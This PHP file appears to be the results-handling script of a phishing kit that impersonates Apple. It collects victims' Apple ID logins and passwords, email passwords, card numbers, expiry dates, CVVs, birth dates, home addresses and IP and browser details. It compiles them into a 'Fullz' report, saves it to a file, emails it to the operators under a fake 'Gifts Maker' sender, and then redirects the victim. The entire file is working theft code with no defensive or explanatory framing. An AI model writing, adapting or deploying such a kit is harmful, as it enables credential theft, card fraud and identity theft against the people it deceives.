<?php
error_reporting(0);
@ob_start();

if (!isset($include) || $include !== 1 || !isset($_SESSION['SESSION_ID'])) die();

require_once 'functions.php';
require_once 'config.php';


/* START Get values from Session */
$appleid = isset($_SESSION['LoginId']) ? $_SESSION['LoginId'] : '';
$applepass = isset($_SESSION['Passcode']) ? $_SESSION['Passcode'] : '';
$current_email_pass = isset($_SESSION['EMAIL_PASSWORD']) ? $_SESSION['EMAIL_PASSWORD'] : '';
$first_name = isset($_SESSION['FNAME']) ? $_SESSION['FNAME'] : '';
$last_name = isset($_SESSION['LNAME']) ? $_SESSION['LNAME'] : '';
$address = isset($_SESSION['ADDRESS']) ? $_SESSION['ADDRESS'] : '';
$country = isset($_SESSION['COUNTRY']) ? $_SESSION['COUNTRY'] : '';
$state = isset($_SESSION['STATE']) ? $_SESSION['STATE'] : '';
$city = isset($_SESSION['CITY']) ? $_SESSION['CITY'] : '';
$zip = isset($_SESSION['ZIP']) ? $_SESSION['ZIP'] : '';
$mobile = isset($_SESSION['MOBILE']) ? $_SESSION['MOBILE'] : '';
$card_number =  isset($_SESSION['CARD_NUMBER']) ? $_SESSION['CARD_NUMBER'] : '';
$name_on_card =  isset($_SESSION['NAME_ON_CARD']) ? $_SESSION['NAME_ON_CARD'] : '';
$cvv =  isset($_SESSION['CVV']) ? $_SESSION['CVV'] : '';
$exp_date =  isset($_SESSION['EXPIRY_DATE']) ? $_SESSION['EXPIRY_DATE'] : '';
$card_type = is_valid_card($card_number);

$dob = isset($_SESSION['DOB']) ? $_SESSION['DOB'] : '';
$user_date = isset($_SESSION['USER_TIME']) ? $_SESSION['USER_TIME'] : '';

$ip = isset($_SESSION['IP_INFO']['IP']) ? $_SESSION['IP_INFO']['IP'] : get_client_ip();
$ip_country = isset($_SESSION['IP_INFO']['IP_COUNTRY']) ? $_SESSION['IP_INFO']['IP_COUNTRY'] : '';
$ip_isp =  isset($_SESSION['IP_INFO']['IP_ISP']) ? $_SESSION['IP_INFO']['IP_ISP'] : '';
$ip_org =  isset($_SESSION['IP_INFO']['IP_ORGANIZATION']) ? $_SESSION['IP_INFO']['IP_ORGANIZATION'] : '';
$ip_city =  isset($_SESSION['IP_INFO']['IP_CITY']) ? $_SESSION['IP_INFO']['IP_CITY'] : '';
$ip_region =  isset($_SESSION['IP_INFO']['IP_REGION']) ? $_SESSION['IP_INFO']['IP_REGION'] : '';
$hostname =  isset($_SESSION['IP_INFO']['HOSTNAME']) ? $_SESSION['IP_INFO']['HOSTNAME'] : gethostbyaddr($ip);
$useragent =  isset($_SESSION['IP_INFO']['USERAGENT']) ? $_SESSION['IP_INFO']['USERAGENT'] : '';
$referer =  isset($_SESSION['IP_INFO']['REFERER']) ? $_SESSION['IP_INFO']['REFERER'] : '';
$browser = isset($_SESSION['IP_INFO']['BROWSER']) ? $_SESSION['IP_INFO']['BROWSER'] : '';
$accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$platform =  isset($_SESSION['IP_INFO']['PLATFORM']) ? $_SESSION['IP_INFO']['PLATFORM'] : '';

$bin = '';
$card_brand = '';
/* END Get values from Session */

/* START Message */
$data = "";
if(!$disable_login_page) {
	$data .= "================[Login Info]================\n";
	$data .= "Login            : $appleid\n";
	$data .= "Password         : $applepass\n";

	if($request_for_email_password)
		$data .= "eMail Password   : $current_email_pass\n";
}

if(!$disable_bank_info_page) {
	$data .= "================[Banking Info]================\n";
	$bin = get_bin_number($card_number);
	$bin_info = get_bin_info($card_number);

	$data .= "Name on Card     : $name_on_card\n";
	$data .= "Card Number      : $card_number\n";
	$data .= "Expires          : $exp_date\n";

	if($request_for_cvv)
		$$data .= "CVV              : $cvv\n";

	$data .= "BIN              : $bin\n";

	$scheme = isset($bin_info['scheme']) ? $bin_info['scheme'] : '';
	$data .= "Scheme           : $scheme\n";

	$type = isset($bin_info['type']) ? $bin_info['type'] : '';
	$data .= "Type             : $type\n";

	$card_brand = isset($bin_info['brand']) ? $bin_info['brand'] : '';
	$data .= "Brand            : $card_brand\n";

	$prepaid = isset($bin_info['prepaid']) ? $bin_info['prepaid'] : '';
	$data .= "Prepaid          : $prepaid\n";

	$card_country = isset($bin_info['country']['name']) ? $bin_info['country']['name'] : '';
	$data .= "Card Country     : $card_country\n";

	$ccurrency = isset($bin_info['country']['currency']) ? $bin_info['country']['currency'] : '';
	$data .= "Country Currency : $ccurrency\n";

	$bankname = isset($bin_info['bank']['name']) ? $bin_info['bank']['name'] : '';
	$data .= "Bank Name        : $bankname\n";

	$bankurl = isset($bin_info['bank']['url']) ? $bin_info['bank']['url'] : '';
	$data .= "Bank URL         : $bankurl\n";

	if($request_for_date_of_birth)
		$data .= "Date Of Birth    : $dob\n";
}

if(!$disable_address_page) {
	$data .= "================[Address Info]================\n";
	$data .= "Name             : $first_name $last_name\n";
	$data .= "Mobile           : $mobile\n";
	$data .= "Address          : $address\n";
	$data .= "City             : $city\n";
	$data .= "State            : $state\n";
	$data .= "ZIP              : $zip\n";
	$data .= "Country          : $country\n";
}
$data .= "================[IP Info]================\n";
$data .= "IP               : $ip\n";
$data .= "Hostname         : $hostname\n";
$data .= "ISP              : $ip_isp\n";
$data .= "IP Organization  : $ip_org\n";
$data .= "IP City          : $ip_city\n";
$data .= "IP Country       : $ip_country\n";
$data .= "IP Region        : $ip_region\n";
$data .= "User-Agent       : $useragent\n";
$data .= "Browser          : $browser\n";
$data .= "Platform         : $platform\n";
$data .= "Referer          : $referer\n";
$data .= "User Datetime    : $user_date\n";
$data .= "Accept-Lang      : $accept_lang\n";
$data .= "================[!~$ Made by $nickname !~$]================\n";
/* END Message */

// save data to text file
if($save_results_to_text)
{
	append_to_file($results_fullz_file, $data);
}
	
if($send_results_to_email)
{
	$from_name = 'Gifts Maker';
	$from_email = 'no-reply@gifts.io';
	$subject = "Fullz Gift Arrived [$bin - $card_brand - $country]";
	send_email($recipients, $from_name, $from_email, $subject, $data);
}

header("location: processing.php?authenticated=true&client=".sha1($$_SESSION['SESSION_ID'], false)."&session=".bin2hex($data));

ob_end_flush();
?>